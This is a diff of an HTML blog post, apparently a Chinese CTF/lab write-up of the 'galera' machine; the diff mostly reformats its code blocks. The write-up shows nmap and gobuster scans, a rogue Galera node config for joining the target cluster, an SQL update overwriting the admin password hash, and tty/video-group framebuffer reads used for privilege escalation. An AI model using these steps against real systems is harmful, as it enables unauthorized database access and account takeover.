@@ -109,7 +109,7 @@ gobuster dir -u http://192.168.218.181/ -w /usr/share/seclists/Discovery/Web-Con
 <meta property="og:url" content="https://dehua-rd.github.io/post/galera.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
 <title>galera</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -182,7 +182,8 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <hr>
 <h2>信息收集阶段</h2>
 <p>首先对目标进行端口扫描，发现开放的服务如下：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nmap -sC -sV -A 192.168.1.100</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">nmap -sC -sV -A 192.168.1.100
+</code></pre>
 <pre class="notranslate"><code class="notranslate">22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
 | ssh-hostkey:
 | 256 28:50:32:2f:bb:ef:7e:51:c3:59:cb:e6:40:88:0e:4e (ECDSA)
@@ -195,7 +196,8 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <hr>
 <h2>漏洞利用过程</h2>
 <p>发现 80 端口是一个登录页面，进行目录扫描：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">gobuster dir -u http://192.168.218.181/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">gobuster dir -u http://192.168.218.181/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,txt,html
+</code></pre>
 <pre class="notranslate"><code class="notranslate">/login.php (Status: 302) [--&gt; /]
 /logout.php (Status: 302) [--&gt; index.php]
 /config.php (Status: 200)
@@ -220,20 +222,22 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <li>任意节点可直连访问</li>
 </ul>
 <p>后来参考一位大佬的 WP，发现可以伪装节点加入集群。</p>
-<div class="highlight highlight-source-ini"><pre class="notranslate"><span class="pl-en">[galera]</span>
-<span class="pl-k">wsrep_on</span> = ON
-<span class="pl-k">wsrep_provider</span> = /usr/lib/galera/libgalera_smm.so
-<span class="pl-k">wsrep_cluster_address</span> = <span class="pl-s"><span class="pl-pds">"</span>gcomm://192.168.218.181:4567<span class="pl-pds">"</span></span>
-<span class="pl-k">wsrep_node_name</span> = <span class="pl-s"><span class="pl-pds">"</span>sunset<span class="pl-pds">"</span></span>
-<span class="pl-k">wsrep_node_address</span> = <span class="pl-s"><span class="pl-pds">"</span>192.168.218.148<span class="pl-pds">"</span></span>
-<span class="pl-k">binlog_format</span> = row
-<span class="pl-k">default_storage_engine</span> = InnoDB
-<span class="pl-k">wsrep_sst_method</span> = rsync
-<span class="pl-k">bind-address</span> = 0.0.0.0</pre></div>
+<pre lang="ini" class="notranslate"><code class="notranslate">[galera]
+wsrep_on = ON
+wsrep_provider = /usr/lib/galera/libgalera_smm.so
+wsrep_cluster_address = "gcomm://192.168.218.181:4567"
+wsrep_node_name = "sunset"
+wsrep_node_address = "192.168.218.148"
+binlog_format = row
+default_storage_engine = InnoDB
+wsrep_sst_method = rsync
+bind-address = 0.0.0.0
+</code></pre>
 <p>重启数据库服务后成功同步，拿到对方数据库信息：</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9bed1578-e989-49a2-a367-0d114ce571df"><img src="https://github.com/user-attachments/assets/9bed1578-e989-49a2-a367-0d114ce571df" alt="Image" style="max-width: 100%;"></a></p>
 <p>开始还想着爆破，但是太慢了，后面一想，反正会同步复制数据，我直接改。</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">update</span> users <span class="pl-k">set</span> password <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>$2a$10$3NvG5rz1vFOz.bGrDxKI3eAH3WlC1QDGF7Yl5s7WEvKRAUAjuTkZO<span class="pl-pds">"</span></span> <span class="pl-k">where</span> username <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>admin<span class="pl-pds">"</span></span></pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">update users set password = "$2a$10$3NvG5rz1vFOz.bGrDxKI3eAH3WlC1QDGF7Yl5s7WEvKRAUAjuTkZO" where username = "admin"
+</code></pre>
 <p>多次尝试登录后台，成功进入后修改首页内容：</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/973f14ed-abe4-4ec4-b6cf-ff5c666e3f3d"><img src="https://github.com/user-attachments/assets/973f14ed-abe4-4ec4-b6cf-ff5c666e3f3d" alt="Image" style="max-width: 100%;"></a></p>
 <p>接着尝试拿 webshell，但函数被禁用，只能用伪协议查看敏感文件：</p>
@@ -244,16 +248,18 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <hr>
 <h2>提权过程</h2>
 <p>使用 linpeas 发现 root 在 tty20 终端，自己属于多个组，其中 <code class="notranslate">tty</code> 是关键：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">cat /dev/vcs20
-<span class="pl-c"><span class="pl-c">#</span> 或</span>
-cat /dev/vcsa20</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">cat /dev/vcs20
+# 或
+cat /dev/vcsa20
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1269ea35-b1f2-4c9c-a390-3ca213409a04"><img src="https://github.com/user-attachments/assets/1269ea35-b1f2-4c9c-a390-3ca213409a04" alt="Image" style="max-width: 100%;"></a></p>
 <h3>📌 video 组提权思路（HackTricks）</h3>
 <p>目标用户属于 <code class="notranslate">video</code> 组：<br>
 👉 <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#video-group" rel="nofollow">https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#video-group</a></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">donjuandeaustria@galera:/dev$ cat /dev/fb0 <span class="pl-k">&gt;</span> /tmp/screen.raw
+<pre lang="bash" class="notranslate"><code class="notranslate">donjuandeaustria@galera:/dev$ cat /dev/fb0 &gt; /tmp/screen.raw
 donjuandeaustria@galera:/dev$ cat /sys/class/graphics/fb0/virtual_size
-1280,800</pre></div>
+1280,800
+</code></pre>
 <p>将 <code class="notranslate">/tmp/screen.raw</code> 下载后查看，但似乎无内容：</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1e01ea30-1b7d-428c-90fd-75a7883a3a89"><img src="https://github.com/user-attachments/assets/1e01ea30-1b7d-428c-90fd-75a7883a3a89" alt="Image" style="max-width: 100%;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
